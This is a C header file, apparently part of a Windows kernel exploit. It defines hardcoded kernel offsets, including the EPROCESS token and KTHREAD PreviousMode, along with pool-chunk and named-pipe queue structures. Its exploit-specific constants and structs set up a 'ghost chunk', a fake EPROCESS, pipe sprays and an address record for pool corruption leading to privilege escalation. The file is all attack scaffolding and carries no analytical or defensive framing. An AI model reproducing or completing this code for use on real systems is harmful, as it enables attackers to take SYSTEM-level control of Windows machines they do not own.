#ifndef COMMON_H
#define COMMON_H

#include <windows.h>

#define SYSTEM_PID 0x4

// Kernel structure offsets
#define EPROCESS_KTHREAD_OFFSET 0x30
#define EPROCESS_UNIQUE_PROCESS_ID_OFFSET 0x440
#define EPROCESS_ACTIVE_PROCESS_LINKS_OFFSET 0x448
#define EPROCESS_TOKEN_OFFSET 0x4B8
#define EPROCESS_QUOTA_BLOCK_OFFSET 0x568
#define KTHREAD_PREVIOUS_MODE_OFFSET 0x232
#define KTHREAD_THREAD_LIST_ENTRY 0x2F8

// Kernel function and variable offsets
#define nt_PsInitialSystemProcess_OFFSET 0xCFC420
#define nt_ExAllocatePoolWithTag_OFFSET 0x9B7010
#define nt_ExpPoolQuotaCookie_OFFSET 0xCFC9E8
#define nt_RtlpHpHeapGlobals_OFFSET 0xC1DD00
#define Npfs_NpFsdCreate_OFFSET 0xB540
#define Npfs_imp_ExAllocatePoolWithTag_OFFSET 0x7050

// Pipe structure offsets
#define ROOT_PIPE_ATTRIBUTE_OFFSET 0x140
#define ROOT_PIPE_QUEUE_ENTRY_OFFSET 0x48
#define FILE_OBJECT_OFFSET 0x30

// Pool chunk constants
#define TARGETED_VULN_SIZE 0x200
#define TARGETED_VULN_BUFSIZE (TARGETED_VULN_SIZE - sizeof(pipe_queue_entry_t))
#define GHOST_CHUNK_SIZE 0x360
#define GHOST_CHUNK_BUFSIZE (GHOST_CHUNK_SIZE - sizeof(pipe_queue_entry_t))
#define PREV_CHUNK_OFFSET 0x50
#define NEXT_CHUNK_OFFSET 0x3F0

// Fake eprocess constants
#define FAKE_EPROCESS_SIZE 0x800
#define FAKE_EPROCESS_OFFSET 0x50

// Spray constants
#define SPRAY_SIZE 0x80 * 10

// PipeAttribute name constants
#define ATTRIBUTE_NAME "Z"
#define ATTRIBUTE_NAME_LEN sizeof(ATTRIBUTE_NAME)
#define DUMB_ATTRIBUTE_NAME "DUMB"
#define DUMB_ATTRIBUTE_NAME_LEN sizeof(DUMB_ATTRIBUTE_NAME)

// Kernel structures
typedef struct _HEAP_VS_CHUNK_HEADER
{
    uint16_t MemoryCost;
    uint16_t UnsafeSize;
    uint16_t UnsafePrevSize;
    uint8_t Allocated;
    uint8_t Unused1;
    uint8_t EncodedSegmentPageOffset;
    uint8_t Unused2[7];
} HEAP_VS_CHUNK_HEADER;
static_assert(sizeof(HEAP_VS_CHUNK_HEADER) == 0x10, "HEAP_VS_CHUNK_HEADER must be 0x10 bytes");

typedef struct _POOL_HEADER
{
    uint8_t PreviousSize;
    uint8_t PoolIndex;
    uint8_t BlockSize;
    uint8_t PoolType;
    uint32_t PoolTag;
    uintptr_t ProcessBilled;
} POOL_HEADER;
static_assert(sizeof(POOL_HEADER) == 0x10, "POOL_HEADER must be 0x10 bytes");

typedef struct pipe_attribute
{
    LIST_ENTRY list;
    char* AttributeName;
    uint64_t ValueSize;
    char* AttributeValue;
    char data[0];
} pipe_attribute_t;

typedef struct pipe_queue_entry
{
    LIST_ENTRY list;
    uintptr_t linkedIRP;
    uintptr_t SecurityClientContext;
    unsigned long isDataInKernel;
    unsigned long remaining_bytes;
    unsigned long DataSize;
    unsigned long field_2C;
    char data[0];
} pipe_queue_entry_t;
static_assert(sizeof(pipe_queue_entry_t) == 0x30, "pipe_queue_entry_t must be 0x30 bytes");

typedef struct pipe_queue_entry_sub
{
    uint64_t unk;
    uint64_t unk1;
    uint64_t unk2;
    uint64_t data_ptr;
} pipe_queue_entry_sub_t;

// Exploit structures
typedef struct vs_chunk
{
    uintptr_t encoded_vs_header[2];
    POOL_HEADER pool_header;
    pipe_queue_entry_t pipe_queue_entry;
} vs_chunk_t;

typedef struct pipe_pair
{
    HANDLE write;
    HANDLE read;
} pipe_pair_t;

typedef struct pipe_spray
{
    size_t nb;
    size_t bufsize;
    char* data_buf;
    pipe_pair_t pipes[1];
} pipe_spray_t;

typedef struct lookaside
{
    size_t size;
    pipe_spray_t* first;
    pipe_spray_t* second;
    pipe_spray_t* drain;
    char* buf;
} lookaside_t;

typedef struct exploit_pipes
{
    pipe_pair_t* ghost_pipe;
    pipe_pair_t* previous_pipe;
    pipe_spray_t* fake_pool_header;
} exploit_pipes_t;

typedef struct exploit_addresses
{
    uintptr_t kernel_base;
    uintptr_t ExpPoolQuotaCookie;
    uintptr_t RtlpHpHeapGlobals;

    uintptr_t self_kthread;
    uintptr_t self_eprocess;

    uintptr_t ghost_vs_chunk;
    uintptr_t vs_sub_segment;

    uintptr_t root_pipe_queue_entry;
    uintptr_t root_pipe_attribute;

    uintptr_t fake_eprocess;
} exploit_addresses_t;

#endif // COMMON_H